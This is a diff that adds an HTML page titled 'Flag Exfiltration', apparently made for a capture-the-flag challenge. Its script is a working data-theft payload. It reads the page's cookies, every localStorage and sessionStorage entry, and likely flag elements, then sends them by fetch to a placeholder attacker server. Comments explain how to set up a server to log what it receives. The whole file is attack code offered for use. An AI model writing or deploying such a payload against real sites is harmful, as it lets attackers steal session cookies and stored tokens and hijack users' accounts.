@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flag Exfiltration</title>
+</head>
+<body>
+    <script>
+        // Replace 'YOUR_EXFILTRATION_SERVER' with the URL of a server you control
+        // This server should be set up to log incoming requests, e.g., a simple Python Flask app or a PHP script.
+        const EXFILTRATION_SERVER = 'http://YOUR_EXFILTRATION_SERVER';
+
+        // Function to send data to your server
+        function sendData(type, data) {
+            if (data) {
+                fetch(`${EXFILTRATION_SERVER}/capture?type=${type}&data=` + encodeURIComponent(data))
+                    .then(response => console.log(`${type} sent`))
+                    .catch(error => console.error(`Error sending ${type}:`, error));
+            }
+        }
+
+        // Attempt to exfiltrate document.cookie
+        sendData('cookies', document.cookie);
+
+        // Attempt to exfiltrate localStorage
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            sendData('localStorage', `[${key}]=${value}`);
+        }
+
+        // Attempt to exfiltrate sessionStorage
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const value = sessionStorage.getItem(key);
+            sendData('sessionStorage', `[${key}]=${value}`);
+        }
+
+        // If the flag is in the DOM, try to find it
+        // This is a generic example; you might need to inspect the target page's HTML
+        // for specific element IDs or classes that might contain the flag.
+        const possibleFlagElements = [
+            document.querySelector('.flag'),
+            document.getElementById('flag'),
+            document.querySelector('pre'), // Sometimes flags are in <pre> tags
+            document.querySelector('code') // Or <code> tags
+        ];
+
+        possibleFlagElements.forEach(element => {
+            if (element && element.textContent) {
+                sendData('domFlag', element.textContent);
+            }
+        });
+
+    </script>
+</body>
+</html>
